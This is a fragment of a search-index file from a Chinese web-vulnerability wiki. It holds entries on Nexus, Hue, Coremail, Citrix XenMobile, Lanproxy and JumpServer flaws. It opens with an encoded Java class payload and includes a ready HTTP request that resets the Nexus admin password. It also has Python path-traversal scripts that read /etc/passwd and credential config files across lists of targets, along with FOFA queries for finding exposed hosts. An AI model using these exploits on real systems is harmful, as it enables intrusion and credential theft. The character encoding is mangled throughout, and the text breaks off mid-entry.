l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}\"] } } Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10204.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10204.html","title":"Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10204","keywords":"","body":"Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10204 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger change-password ‰ΩéÊùÉÈôê‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û CVE-2020-11444.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger change-password ‰ΩéÊùÉÈôê‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û CVE-2020-11444.html","title":"Nexus Repository Manger change-password ‰ΩéÊùÉÈôê‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û CVE-2020-11444","keywords":"","body":"Nexus Repository Manger change-password ‰ΩéÊùÉÈôê‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û CVE-2020-11444 ÊºèÊ¥ûÊèèËø∞ Nexus Repository MangerÂ≠òÂú®‰ΩéÊùÉÈôê‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥ûÔºå‰ΩéÊùÉÈôêÁî®Êà∑ÂèëÈÄÅÁâπÂÆöÁöÑËØ∑Ê±ÇÂåÖÂèØ‰ª•‰øÆÊîπÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Nexus 3.x OSS / Pro ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204 ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûËß¶ÂèëÈúÄË¶Å‰ªªÊÑèË¥¶Êà∑ÊùÉÈôê ÁôªÂΩï‰ªªÊÑèÁî®Êà∑Âêé‰øÆÊîπ NXSESSIONIDÔºåÂèëÈÄÅËØ∑Ê±ÇÂåÖ‰øÆÊîπÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†Å PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1 Host: accept: application/json User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.6080434247960143 Content-Type: text/plain Origin: http://139.198.174.173:8081 Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=76b37c99-046c-47a9-ba7d-fd4cfa33b7ff Content-Length: 11 data=123456 ËøîÂõû204Âàô‰øÆÊîπÊàêÂäü Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Hue/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Hue/","title":"Hue","keywords":"","body":"Hue Hue ÂêéÂè∞ÁºñËæëÂô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Hue/Hue ÂêéÂè∞ÁºñËæëÂô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Hue/Hue ÂêéÂè∞ÁºñËæëÂô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Hue ÂêéÂè∞ÁºñËæëÂô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Hue ÂêéÂè∞ÁºñËæëÂô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Hue ÂêéÂè∞ÁºñËæëÂô®Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÁºñËæë‰∏ä‰º† xxx.sh Êñá‰ª∂Âç≥ÂèØËææÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑÁõÆÁöÑ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Hue ÂêéÂè∞ÁºñËæëÂô® FOFA [!NOTE] title=\"Hue - Ê¨¢Ëøé‰ΩøÁî® Hue\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ‰∏ä‰º†Âπ∂ÁºñËæëÊñá‰ª∂‰∏∫ÊâßË°åÁöÑÂëΩ‰ª§ ÊåâÂ¶Ç‰∏ãÊ≠•È™§ÁÇπÂáªÂç≥ÂèØÊâßË°åÊÉ≥Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Coremail/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Coremail/","title":"Coremail","keywords":"","body":"Coremail Coremail ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Coremail/Coremail ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Coremail/Coremail ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Coremail ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Coremail ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Coremail Êüê‰∏™Êé•Âè£Â≠òÂú®ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÂÖ∂‰∏≠Â≠òÂú®Á´ØÂè£ÔºåÈÖçÁΩÆ‰ø°ÊÅØÁ≠â ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Coremail ÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û FOFA [!NOTE] app=\"CoremailÈÇÆ‰ª∂Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ POC‰∏∫ http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/ Goby & POC [!NOTE] Coremail configuration information disclosure Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Citrix XenMobile/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Citrix XenMobile/","title":"Citrix XenMobile","keywords":"","body":"Citrix XenMobile‰ºÅ‰∏öÁßªÂä®ÊÄßÁÆ°ÁêÜÁ≥ªÁªü Citrix XenMobile ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CVE-2020-8209 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Citrix XenMobile/Citrix XenMobile ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CVE-2020-8209.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Citrix XenMobile/Citrix XenMobile ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CVE-2020-8209.html","title":"Citrix XenMobile ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CVE-2020-8209","keywords":"","body":"Citrix XenMobile ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CVE-2020-8209 ÊºèÊ¥ûÊèèËø∞ XenMobileÊòØCitrixÂºÄÂèëÁöÑ‰ºÅ‰∏öÁßªÂä®ÊÄßÁÆ°ÁêÜËΩØ‰ª∂„ÄÇËØ•‰∫ßÂìÅÂÖÅËÆ∏‰ºÅ‰∏öÁÆ°ÁêÜÂëòÂ∑•ÁöÑÁßªÂä®ËÆæÂ§áÂíåÁßªÂä®Â∫îÁî®Á®ãÂ∫è„ÄÇËØ•ËΩØ‰ª∂ÁöÑÁõÆÁöÑÊòØÈÄöËøáÂÖÅËÆ∏ÂëòÂ∑•ÂÆâÂÖ®Âú∞Âú®‰ºÅ‰∏öÊã•ÊúâÁöÑÂíå‰∏™‰∫∫ÁßªÂä®ËÆæÂ§áÂèäÂ∫îÁî®Á®ãÂ∫è‰∏äÂ∑•‰ΩúÊù•ÊèêÈ´òÁîü‰∫ßÁéá„ÄÇ CVE-2020-8209ÔºåË∑ØÂæÑÈÅçÂéÜÊºèÊ¥û„ÄÇÊ≠§ÊºèÊ¥ûÂÖÅËÆ∏Êú™ÁªèÊéàÊùÉÁöÑÁî®Êà∑ËØªÂèñ‰ªªÊÑèÊñá‰ª∂ÔºåÂåÖÊã¨ÂåÖÂê´ÂØÜÁ†ÅÁöÑÈÖçÁΩÆÊñá‰ª∂ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] RP2‰πãÂâçÁöÑXenMobileÊúçÂä°Âô®10.12 RP4‰πãÂâçÁöÑXenMobileÊúçÂä°Âô®10.11 RP6‰πãÂâçÁöÑXenMobileÊúçÂä°Âô®10.1010.9 RP5‰πãÂâçÁöÑXenMobileÊúçÂä°Âô® FOFA [!NOTE] title=\"XenMobile\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd ÂèØ‰ª•ÊàêÂäü‰∏ãËΩΩ/etc/passwdÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Citrix XenMobile \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CVE-2020-8209.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] Âê´ÊúâCVE-2020-8209ÊºèÊ¥ûÔºåÊàêÂäüËØªÂèñ/etc/passwd\\033[0m\\n{} \".format(response.text)) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl > >> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Lanproxy/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Lanproxy/","title":"Lanproxy","keywords":"","body":"Lanproxy Lanproxy ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2021-3019 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Lanproxy/Lanproxy ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2021-3019.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Lanproxy/Lanproxy ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2021-3019.html","title":"Lanproxy ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2021-3019","keywords":"","body":"Lanproxy ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CVE-2021-3019 ÊºèÊ¥ûÊèèËø∞ LanproxyÊòØ‰∏Ä‰∏™Â∞ÜÂ±ÄÂüüÁΩë‰∏™‰∫∫ÁîµËÑë„ÄÅÊúçÂä°Âô®‰ª£ÁêÜÂà∞ÂÖ¨ÁΩëÁöÑÂÜÖÁΩëÁ©øÈÄèÂ∑•ÂÖ∑ÔºåÊîØÊåÅtcpÊµÅÈáèËΩ¨ÂèëÔºåÂèØÊîØÊåÅ‰ªª‰Ωïtcp‰∏äÂ±ÇÂçèËÆÆÔºàËÆøÈóÆÂÜÖÁΩëÁΩëÁ´ô„ÄÅÊú¨Âú∞ÊîØ‰ªòÊé•Âè£Ë∞ÉËØï„ÄÅsshËÆøÈóÆ„ÄÅËøúÁ®ãÊ°åÈù¢Á≠âÁ≠âÔºâÊú¨Ê¨°Lanproxy Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û (CVE-2021-3019)ÈÄöËøá../ÁªïËøáËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÇËØ•ÊºèÊ¥ûÂÖÅËÆ∏ÁõÆÂΩïÈÅçÂéÜËØªÂèñ/../conf/config.propertiesÊù•Ëé∑ÂèñÂà∞ÂÜÖÈÉ®ÁΩëËøûÊé•ÁöÑÂá≠ÊçÆ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Lanproxy 0.1 FOFA [!NOTE] header= \"Server: LPS-0.1\" ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/ffay/lanproxy/ ÊºèÊ¥ûÂ§çÁé∞ ÊâìÂºÄÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî®BurpÊäìÂåÖÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±Ç GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close ÊàêÂäüÂú®ÈÖçÁΩÆÊñá‰ª∂‰∏≠ËØªÂèñ Ë¥¶Âè∑ÂØÜÁ†Å ËØïÁùÄËØªÂèñÂÖ∂‰ªñÊïèÊÑüÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\"} def readConf(url): \"\"\" ÈªòËÆ§ËØªÂèñÈÖçÁΩÆÊñá‰ª∂ÔºåÂπ∂ÈÄöËøáËÉΩÂê¶ËØªÂèñÈÖçÁΩÆÊñá‰ª∂Êù•Âà§Êñ≠ÊòØÂê¶Â≠òÂú®ÊºèÊ¥û \"\"\" config = [ 'config.server.bind', 'config.server.port', 'config.admin.username', 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request.Request(confUrl, headers=headers) try: with request.urlopen(r, timeout=10) as resp: confContent = resp.read().decode('utf-8') for i in config: if i not in confContent: print(\"[-] \" + url + \" is not vulnerable\") return 'Bye :(' print(\"[+] \" + url + \" is vulnerable! :)\") return confContent except ConnectionResetError: print(\"[-] \" + url + \" Connection reset by peer\") except error.HTTPError as e: print(\"[-] \" + url + e.code + e.reason) except error.URLError as e: print(\"[-] \" + url + e.code + e.reason) except: print(\"[-] \" + url + \" is not vulnerable\") return 0 def readOtherFile(url, path): \"\"\" ËØªÂèñ‰ªªÊÑèÂÖ∂‰ªñÊñá‰ª∂ \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request.Request(fullUrl, headers=headers) with request.urlopen(r, timeout=10) as resp: fileContent = resp.read().decode('utf-8') print(fileContent) def run(url, path=\"/../conf/config.properties\"): if os.path.isfile(url) == False: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if path == \"/../conf/config.properties\": print(readConf(url)) else: if readConf(url) not in [0, 'Bye :(']: readOtherFile(url, path) else: urls = [] with open(url) as target: urls = target.read().splitlines() for url in urls: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if readConf(url) not in [0, 'Bye :(']: with open(\"success.txt\", \"a+\") as f: f.write(url + \"\\n\") f.close() def main(): parser = argparse.ArgumentParser( description=\"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\") parser.add_argument('-u', '--url', type=str, help=\"test a single website\") parser.add_argument('-r', '--read', type=str, help=\"this parameter is followed by the file name to be read, the configuration file is read by default\") parser.add_argument('-f', '--file', type=str, help=\"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\") args = parser.parse_args() if len(sys.argv) Goby & POC [!NOTE] Lanproxy_Arbitrary_File_Read_CVE-2021-3019 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/JumpServerÂ†°ÂûíÊú∫/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/JumpServerÂ†°ÂûíÊú∫/","title":"JumpServerÂ†°ÂûíÊú∫","keywords":"","body":"JumpServer Â†°ÂûíÊú∫ JumpServer Êú™ÊéàÊùÉÊé•Âè£ ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/JumpServerÂ†°ÂûíÊú∫/JumpServer Êú™ÊéàÊùÉÊé•Âè£ ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/JumpServerÂ†°ÂûíÊú∫/JumpServer Êú™ÊéàÊùÉÊé•Âè£ ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"JumpServer Êú™ÊéàÊùÉÊé•Âè£ ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"JumpServer Êú™ÊéàÊùÉÊé•Âè£ ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ JumpServer ÊòØÂÖ®ÁêÉÈ¶ñÊ¨æÂÆåÂÖ®ÂºÄÊ∫êÁöÑÂ†°ÂûíÊú∫, ‰ΩøÁî®GNU GPL v2.0 ÂºÄÊ∫êÂçèËÆÆ, ÊòØÁ¨¶Âêà4A ÁöÑ‰∏ì‰∏öËøêÁª¥ÂÆ°ËÆ°Á≥ªÁªü„ÄÇ JumpServer ‰ΩøÁî®Python / Django ËøõË°åÂºÄÂèë„ÄÇ2021Âπ¥1Êúà15Êó•ÔºåÈòøÈáå‰∫ëÂ∫îÊÄ•ÂìçÂ∫î‰∏≠ÂøÉÁõëÊéßÂà∞ÂºÄÊ∫êÂ†°ÂûíÊú∫JumpServerÂèëÂ∏ÉÊõ¥Êñ∞Ôºå‰øÆÂ§ç‰∫Ü‰∏ÄÂ§ÑËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û„ÄÇÁî±‰∫é JumpServer Êüê‰∫õÊé•Âè£Êú™ÂÅöÊéàÊùÉÈôêÂà∂ÔºåÊîªÂáªËÄÖÂèØÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇËé∑ÂèñÂà∞Êó•ÂøóÊñá‰ª∂Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØÔºåÊàñËÄÖÊâßË°åÁõ∏ÂÖ≥APIÊìç‰ΩúÊéßÂà∂ÂÖ∂‰∏≠ÊâÄÊúâÊú∫Âô®„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] JumpServer JumpServer JumpServer JumpServer = v1.5.9 FOFA [!NOTE] app=\"FIT2CLOUD-JumpServer-Â†°ÂûíÊú∫\" ÁéØÂ¢ÉÊê≠Âª∫ ÂÆâË£Ö JumpServer v2.6.1 ÁâàÊú¨ ‰∏ãËΩΩÈìæÊé• [!NOTE] 